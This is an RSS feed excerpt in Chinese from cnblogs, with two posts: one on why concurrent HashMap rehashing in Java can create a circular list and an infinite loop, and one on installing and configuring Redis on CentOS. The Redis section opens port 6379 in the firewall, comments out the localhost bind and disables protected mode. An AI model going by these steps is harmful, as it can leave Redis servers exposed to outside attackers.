        Entry e = src[j];
        &lt;span class=&quot;hljs-keyword&quot;&gt;if (e != &lt;span class=&quot;hljs-literal&quot;&gt;null) {
            src[j] = &lt;span class=&quot;hljs-literal&quot;&gt;null;
            &lt;span class=&quot;hljs-keyword&quot;&gt;do {
                Entry &lt;span class=&quot;hljs-keyword&quot;&gt;next = e.&lt;span class=&quot;hljs-keyword&quot;&gt;next;
                &lt;span class=&quot;hljs-built_in&quot;&gt;int i = indexFor(e.hash, newCapacity);
                e.&lt;span class=&quot;hljs-keyword&quot;&gt;next = newTable[i];
                newTable[i] = e;
                e = &lt;span class=&quot;hljs-keyword&quot;&gt;next;
            } &lt;span class=&quot;hljs-keyword&quot;&gt;while (e != &lt;span class=&quot;hljs-literal&quot;&gt;null);
        }
    }
}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在这个方法里，将旧数组赋值给src，遍历src，当src的元素非null时，就将src中的该元素置null，即将旧数组中的元素置null了，也就是这一句：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs yaml&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;if &lt;span class=&quot;hljs-string&quot;&gt;(e &lt;span class=&quot;hljs-string&quot;&gt;!= &lt;span class=&quot;hljs-literal&quot;&gt;null&lt;span class=&quot;hljs-string&quot;&gt;) &lt;span class=&quot;hljs-string&quot;&gt;{
        &lt;span class=&quot;hljs-string&quot;&gt;src[j] &lt;span class=&quot;hljs-string&quot;&gt;= &lt;span class=&quot;hljs-literal&quot;&gt;null&lt;span class=&quot;hljs-string&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;hashmap数据结构&quot;&gt;HashMap数据结构&lt;/h2&gt;
&lt;p&gt;我需要简单地说一下HashMap这个经典的数据结构。&lt;/p&gt;
&lt;p&gt;HashMap通常会用一个指针数组（假设为table[]）来做分散所有的key，当一个key被加入时，会通过Hash算法通过key算出这个数组的下标i，然后就把这个 插到table[i]中，如果有两个不同的key被算在了同一个i，那么就叫冲突，又叫碰撞，这样会在table[i]上形成一个链表。&lt;/p&gt;
&lt;p&gt;我们知道，如果table[]的尺寸很小，比如只有2个，如果要放进10个keys的话，那么碰撞非常频繁，于是一个O(1)的查找算法，就变成了链表遍历，性能变成了O(n)，这是Hash表的缺陷。&lt;/p&gt;
&lt;p&gt;所以，Hash表的尺寸和容量非常的重要。一般来说，Hash表这个容器当有数据要插入时，都会检查容量有没有超过设定的thredhold，如果超过，需要增大Hash表的尺寸，但是这样一来，整个Hash表里的元素都需要被重算一遍。这叫rehash，这个成本相当的大。&lt;/p&gt;

&lt;h2 id=&quot;hashmap的rehash源代码&quot;&gt;HashMap的rehash源代码&lt;/h2&gt;
&lt;p&gt;下面，我们来看一下Java的HashMap的源代码。Put一个Key,Value对到Hash表中：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cs&quot;&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public V &lt;span class=&quot;hljs-title&quot;&gt;put(&lt;span class=&quot;hljs-params&quot;&gt;K key, V &lt;span class=&quot;hljs-keyword&quot;&gt;value)
{
    ......
    &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;检查容量是否超标：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs verilog&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;void addEntry(&lt;span class=&quot;hljs-keyword&quot;&gt;int hash, K key, V value, &lt;span class=&quot;hljs-keyword&quot;&gt;int bucketIndex)
{
    Entry&amp;lt;K,V&amp;gt; e = &lt;span class=&quot;hljs-keyword&quot;&gt;table[bucketIndex];
    &lt;span class=&quot;hljs-keyword&quot;&gt;table[bucketIndex] = &lt;span class=&quot;hljs-keyword&quot;&gt;new Entry&amp;lt;K,V&amp;gt;(hash, key, value, e);
    &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;新建一个更大尺寸的hash表，然后把数据从老的Hash表中迁移到新的Hash表中。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs verilog&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;void resize(&lt;span class=&quot;hljs-keyword&quot;&gt;int newCapacity)
{
    Entry[] oldTable = &lt;span class=&quot;hljs-keyword&quot;&gt;table;
    &lt;span class=&quot;hljs-keyword&quot;&gt;int oldCapacity = oldTable&lt;span class=&quot;hljs-variable&quot;&gt;.length;
    ......
    &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;迁移的源代码，注意高亮处：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs verilog&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;void transfer(Entry[] newTable)
{
    Entry[] src = &lt;span class=&quot;hljs-keyword&quot;&gt;table;
    &lt;span class=&quot;hljs-keyword&quot;&gt;int newCapacity = newTable&lt;span class=&quot;hljs-variable&quot;&gt;.length;
    &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;好了，这个代码算是比较正常的。而且没有什么问题。&lt;/p&gt;

&lt;h2 id=&quot;正常的rehash过程&quot;&gt;正常的ReHash过程&lt;/h2&gt;
&lt;p&gt;画了个图做了个演示。&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;我假设了我们的hash算法就是简单的用key mod 一下表的大小（也就是数组的长度）。&lt;/li&gt;
&lt;li&gt;最上面的是old hash 表，其中的Hash表的size=2, 所以key = 3, 7, 5，在mod 2以后都冲突在table1这里了。&lt;/li&gt;
&lt;li&gt;接下来的三个步骤是Hash表 resize成4，然后所有的 重新rehash的过程。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img title=&quot;HashMap 001&quot; src=&quot;https://images.cnblogs.com/cnblogs_com/andy-zhou/817145/o_HashMap001.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h2 id=&quot;并发的rehash过程&quot;&gt;并发的Rehash过程&lt;/h2&gt;
&lt;h4 id=&quot;假设我们有两个线程我用红色和浅蓝色标注了一下我们再回头看一下我们的-transfer代码中的这个细节&quot;&gt;（1）假设我们有两个线程。我用红色和浅蓝色标注了一下。我们再回头看一下我们的 transfer代码中的这个细节：&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs lua&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;do {
    Entry&amp;lt;K,V&amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;next = e.&lt;span class=&quot;hljs-built_in&quot;&gt;next; // &amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;而我们的线程二执行完成了。于是我们有下面的这个样子。&lt;/p&gt;
&lt;p&gt;&lt;img title=&quot;HashMap 002&quot; src=&quot;https://images.cnblogs.com/cnblogs_com/andy-zhou/817145/o_HashMap002.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;注意：因为Thread1的 e 指向了key(3)，而next指向了key(7)，其在线程二rehash后，指向了线程二重组后的链表。我们可以看到链表的顺序被反转后。&lt;/p&gt;
&lt;h4 id=&quot;线程一被调度回来执行&quot;&gt;（2）线程一被调度回来执行。&lt;/h4&gt;
&lt;ol&gt;&lt;li&gt;先是执行 newTalbe[i] = e。&lt;/li&gt;
&lt;li&gt;然后是e = next，导致了e指向了key(7)。&lt;/li&gt;
&lt;li&gt;而下一次循环的next = e.next导致了next指向了key(3)。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img title=&quot;HashMap 003&quot; src=&quot;https://images.cnblogs.com/cnblogs_com/andy-zhou/817145/o_HashMap003.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;一切安好&quot;&gt;（3）一切安好。&lt;/h4&gt;
&lt;p&gt;线程一接着工作。把key(7)摘下来，放到newTable[i]的第一个，然后把e和next往下移。&lt;/p&gt;
&lt;p&gt;&lt;img title=&quot;HashMap 004&quot; src=&quot;https://images.cnblogs.com/cnblogs_com/andy-zhou/817145/o_HashMap004.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;环形链接出现&quot;&gt;（4）环形链接出现。&lt;/h4&gt;
&lt;p&gt;e.next = newTable[i] 导致 key(3).next 指向了 key(7)。注意：此时的key(7).next 已经指向了key(3)， 环形链表就这样出现了。&lt;/p&gt;
&lt;p&gt;&lt;img title=&quot;HashMap 005&quot; src=&quot;https://images.cnblogs.com/cnblogs_com/andy-zhou/817145/o_HashMap005.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;于是，当我们的线程一调用到，HashTable.get(11)时，悲剧就出现了——Infinite Loop。&lt;/p&gt;

&lt;h2 id=&quot;三种解决方案&quot;&gt;三种解决方案&lt;/h2&gt;
&lt;h3 id=&quot;hashtable替换hashmap&quot;&gt;Hashtable替换HashMap&lt;/h3&gt;
&lt;p&gt;Hashtable 是同步的，但由迭代器返回的 Iterator 和由所有 Hashtable 的“collection 视图方法”返回的 Collection 的 listIterator 方法都是快速失败的：在创建 Iterator 之后，如果从结构上对 Hashtable 进行修改，除非通过 Iterator 自身的移除或添加方法，否则在任何时间以任何方式对其进行修改，Iterator 都将抛出 ConcurrentModificationException。因此，面对并发的修改，Iterator 很快就会完全失败，而不冒在将来某个不确定的时间发生任意不确定行为的风险。由 Hashtable 的键和值方法返回的 Enumeration 不是快速失败的。&lt;/p&gt;
&lt;p&gt;注意，迭代器的快速失败行为无法得到保证，因为一般来说，不可能对是否出现不同步并发修改做出任何硬性保证。快速失败迭代器会尽最大努力抛出 ConcurrentModificationException。因此，为提高这类迭代器的正确性而编写一个依赖于此异常的程序是错误做法：迭代器的快速失败行为应该仅用于检测程序错误。&lt;/p&gt;
&lt;h3 id=&quot;collections.synchronizedmap将hashmap包装起来&quot;&gt;Collections.synchronizedMap将HashMap包装起来&lt;/h3&gt;
&lt;p&gt;返回由指定映射支持的同步（线程安全的）映射。为了保证按顺序访问，必须通过返回的映射完成对底层映射的所有访问。在返回的映射或其任意 collection 视图上进行迭代时，强制用户手工在返回的映射上进行同步：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs dart&quot;&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;Map m = Collections.synchronizedMap(&lt;span class=&quot;hljs-keyword&quot;&gt;new HashMap());
...
&lt;span class=&quot;hljs-built_in&quot;&gt;Set s = m.keySet();  &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;不遵从此建议将导致无法确定的行为。如果指定映射是可序列化的，则返回的映射也将是可序列化的。&lt;/p&gt;
&lt;h3 id=&quot;concurrenthashmap替换hashmap&quot;&gt;ConcurrentHashMap替换HashMap&lt;/h3&gt;
&lt;p&gt;支持检索的完全并发和更新的所期望可调整并发的哈希表。此类遵守与 Hashtable 相同的功能规范，并且包括对应于 Hashtable 的每个方法的方法版本。不过，尽管所有操作都是线程安全的，但检索操作不必锁定，并且不支持以某种防止所有访问的方式锁定整个表。此类可以通过程序完全与 Hashtable 进行互操作，这取决于其线程安全，而与其同步细节无关。&lt;br/&gt;检索操作（包括 get）通常不会受阻塞，因此，可能与更新操作交迭（包括 put 和 remove）。检索会影响最近完成的更新操作的结果。对于一些聚合操作，比如 putAll 和 clear，并发检索可能只影响某些条目的插入和移除。类似地，在创建迭代器/枚举时或自此之后，Iterators 和 Enumerations 返回在某一时间点上影响哈希表状态的元素。它们不会抛出 ConcurrentModificationException。不过，迭代器被设计成每次仅由一个线程使用。&lt;/p&gt;
</description>
<pubDate>Fri, 18 Jan 2019 15:23:00 +0000</pubDate>
<dc:creator>羽落风痕</dc:creator>
<og:description>目录 转载: HashMap多线程并发问题分析 并发问题的症状 多线程put后可能导致get死循环 从前我们的Java代码因为一些原因使用了HashMap这个东西，但是当时的程序是单线程的，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lan-ge/p/10290169.html</dc:identifier>
</item>
<item>
<title>centos安装Redis - 请叫我头头哥</title>
<link>http://www.cnblogs.com/toutou/p/install_redis.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/toutou/p/install_redis.html</guid>
<description>&lt;h2 id=&quot;_nav_0&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;Redis的安装&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;♛ 1.0 下载Redis&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wget http://download.redis.io/releases/redis-5.0.2.tar.gz&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222092817738-1613746144.png&quot; alt=&quot;centos安装Redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;♛ 1.1 解压&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;tar -zxvf redis-5.0.2.tar.gz&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222092823300-1997336175.png&quot; alt=&quot;centos安装Redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;♛ 1.2 安装gcc依赖&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Redis是C实现的，需要gcc来进行编译，先安装gcc。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;yum install gcc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222092829386-147793550.png&quot; alt=&quot;centos安装redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;♛ 1.3 打开Redis目录&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cd redis-5.0.2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222092834985-470391507.png&quot; alt=&quot;centos安装Redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;♛ 1.4 编译安装&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;make MALLOC=libc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222092840277-26862129.png&quot; alt=&quot;centos安装Redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;将/home/toutou/redis-5.0.2/src目录下的文件加到/usr/local/bin目录&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cd src &amp;amp;&amp;amp; make install&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222092846815-1534345829.png&quot; alt=&quot;centos安装Redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;♛ 1.5 查看当前Redis版本&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;redis-server -v&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222092854315-1450652187.png&quot; alt=&quot;centos安装Redis&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;_nav_1&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;Redis启动方式&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;♛ 2.0 通过命令启动&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;./redis-server&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222092900406-546026621.png&quot; alt=&quot;centos安装Redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222092905791-587037925.png&quot; alt=&quot;centos安装Redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如上图：redis启动成功，默认不是以守护进程的方式运行, 不太方便。同样按 ctrl + c可以关闭窗口。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;♛ 2.1 后台进程式启动redis&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2.1.1 修改redis.conf文件&lt;/p&gt;
&lt;p&gt;Redis默认不是以守护进程的方式运行，可以通过该配置项修改，使用yes启用守护进程&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cd ..&lt;/code&gt;退到上一级目录。 然后编辑&lt;code&gt;vim redis.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;将&quot;daemonize no&quot;修改为&quot;daemonize yes&quot;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222092912733-1972494353.png&quot; alt=&quot;centos安装redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222092932144-1277318131.png&quot; alt=&quot;centos安装redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2.1.2 指定redis.conf文件启动&lt;/p&gt;
&lt;p&gt;&lt;code&gt;./redis-server /home/toutou/redis-5.0.2/redis.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222092937766-1457947878.png&quot; alt=&quot;centos安装Redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2.1.3 查看Redis进程&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ps -aux | grep redis&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222093001809-92319503.png&quot; alt=&quot;centos安装Redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2.1.4 关闭Redis进程&lt;/p&gt;
&lt;p&gt;&lt;code&gt;kill -9 5933&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;就保留一个auto redis。&lt;/p&gt;
&lt;h2 id=&quot;_nav_2&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;设置redis开机自动启动&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;♛ 3.0 创建目录及相关脚本&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;3.0.1 创建redis目录&lt;/p&gt;
&lt;p&gt;进入etc目录&lt;code&gt;cd /etc&lt;/code&gt; 然后创建目录&lt;code&gt;mkdir redis&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222111447780-1226390031.png&quot; alt=&quot;centos安装Redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3.0.2 复制redis.conf文件/p&amp;gt;&lt;/p&gt;
&lt;p&gt;进入redis目录&lt;code&gt;cd redis&lt;/code&gt;然后复制文件&lt;code&gt;cp /home/toutou/redis-5.0.2/redis.conf /etc/redis/6379.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3.0.3 复制redis_init_script&lt;/p&gt;
&lt;p&gt;进入init.d目录&lt;code&gt;/etc/init.d&lt;/code&gt; 复制一份脚本至/etc/init.d目录下&lt;code&gt;cp /home/toutou/redis-5.0.2/utils/redis_init_script /etc/init.d/redis-toutou&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222111453670-1858727415.png&quot; alt=&quot;centos安装redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3.0.4 配置redis开机自启动&lt;/p&gt;
&lt;p&gt;切换到init.d目录&lt;code&gt;cd /etc/init.d&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;chkconfig redis-toutou on&lt;/code&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;注意：若提示service redis-toutou does not support chkconfig，则按下面方法操作:&lt;/p&gt;
&lt;p&gt;使用vim编辑redis-toutou文件，在第一行加入如下两行注释，保存退出&lt;/p&gt;
&lt;p&gt;&lt;code&gt;# chkconfig: 2345 90 10&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;# description: Redis is a persistent key-value database&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;注释的意思是，redis服务必须在运行级2，3，4，5下被启动或关闭，启动的优先级是90，关闭的优先级是10。&lt;/p&gt;
&lt;p&gt;再次执行开机自启命令。&lt;code&gt;chkconfig redis-toutou on&lt;/code&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;3.0.5 通过服务启动redis&lt;/p&gt;
&lt;p&gt;&lt;code&gt;service redis-toutou start&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222111506435-894014197.png&quot; alt=&quot;centos安装redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3.0.5 通过服务关闭redis&lt;/p&gt;
&lt;p&gt;&lt;code&gt;service redis-toutou stop&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222111512254-1448303493.png&quot; alt=&quot;centos安装redis&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;_nav_3&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;Redis服务redis-cli&lt;/h2&gt;
&lt;p&gt;4.0 进入本机redis&lt;/p&gt;
&lt;p&gt;进入redis服务模式&lt;code&gt;redis-cli&lt;/code&gt;   若是进入远程的redis服务&lt;code&gt;redis-cli -h host -p port -a password&lt;/code&gt;     -h 服务器地址 -p 端口号 -a 密码&lt;/p&gt;
&lt;p&gt;列出所有key&lt;code&gt;keys *&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;设置key/value&lt;code&gt;set toutou test&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查询key&lt;code&gt;get toutou&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;4.1 退出&lt;/p&gt;
&lt;p&gt;退出redis服务模式&lt;code&gt;quit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222151854175-1932217994.png&quot; alt=&quot;centos安装redis&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;_nav_3&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;设置Redis密码及端口&lt;/h2&gt;
&lt;p&gt;查看端口号&lt;code&gt;netstat -ntlp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201901/506684-20190116104122429-1068289255.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;5.0 设置防火墙&lt;/p&gt;
&lt;p&gt;防火墙开放6379端口&lt;code&gt;/sbin/iptables -I INPUT -p tcp --dport 6379 -j ACCEPT&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;保存&lt;code&gt;/etc/rc.d/init.d/iptables save&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;centos 7下执行&lt;code&gt;service iptables save&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;5.1 设置密码&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vim /etc/redis/6379.conf&lt;/code&gt; 修改默认密码，查找 requirepass foobared 将 foobared 修改为你的密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222151911524-1749122976.png&quot; alt=&quot;centos安装redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;VIM的字符串查找功能, 输入 / 或者 ？  加 需要查找的字符串来进行搜索，比如想搜索 super 这个单词， 可以输入  /super  或者  ？super，  两者的区别是前者是从上往下搜索，后者是从下往上搜索。&lt;/p&gt;
&lt;p&gt;5.2 更新端口号&lt;/p&gt;
&lt;p&gt;修改默认端口，查找&lt;code&gt;port 6379&lt;/code&gt;, 修改默认端口6379为你想要的端口即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201812/506684-20181222151917797-595356168.png&quot; alt=&quot;centos安装redis&quot;/&gt;&lt;/p&gt;
&lt;p&gt;5.3 若允许外面的机器连接,还需要下面两步&lt;/p&gt;
&lt;p&gt;修改/etc/redis/6379.conf，将&lt;code&gt;bind 127.0.0.1&lt;/code&gt;注释掉，允许外面的机器连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201901/506684-20190116143703729-747155169.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;将&lt;code&gt;protected mode&lt;/code&gt;的值改为&lt;code&gt;no&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201901/506684-20190116143710214-1389078336.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;_nav_4&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;redis.conf配置项详细文档&lt;/h2&gt;
&lt;div readability=&quot;149&quot;&gt;
&lt;p&gt;1. Redis默认不是以守护进程的方式运行，可以通过该配置项修改，使用yes启用守护进程&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;daemonize no&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2. 当Redis以守护进程方式运行时，Redis默认会把pid写入/var/run/redis.pid文件，可以通过pidfile指定&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;pidfile /var/run/redis.pid&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;3. 指定Redis监听端口，默认端口为6379。&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;port 6379&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;4. 绑定的主机地址&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;bind 127.0.0.1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;5.当 客户端闲置多长时间后关闭连接，如果指定为0，表示关闭该功能&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;timeout 300&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;6. 指定日志记录级别，Redis总共支持四个级别：debug、verbose、notice、warning，默认为verbose&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;loglevel verbose&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;7. 日志记录方式，默认为标准输出，如果配置Redis为守护进程方式运行，而这里又配置为日志记录方式为标准输出，则日志将会发送给/dev/null&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;logfile stdout&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;8. 设置数据库的数量，默认数据库为0，可以使用SELECT &lt;code&gt;&amp;lt;dbid&amp;gt;&lt;/code&gt;命令在连接上指定数据库id&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;databases 16&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;9. 指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配合&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;save &lt;code&gt;&amp;lt;seconds&amp;gt;&lt;/code&gt; &lt;code&gt;&amp;lt;changes&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;    Redis默认配置文件中提供了三个条件：&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;save 900 1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;    save 300 10&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;    save 60 10000&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;    分别表示900秒（15分钟）内有1个更改，300秒（5分钟）内有10个更改以及60秒内有10000个更改。&lt;/p&gt;
&lt;p&gt;10. 指定存储至本地数据库时是否压缩数据，默认为yes，Redis采用LZF压缩，如果为了节省CPU时间，可以关闭该选项，但会导致数据库文件变的巨大&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;rdbcompression yes&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;11. 指定本地数据库文件名，默认值为dump.rdb&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;dbfilename dump.rdb&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;12. 指定本地数据库存放目录&lt;/p&gt;
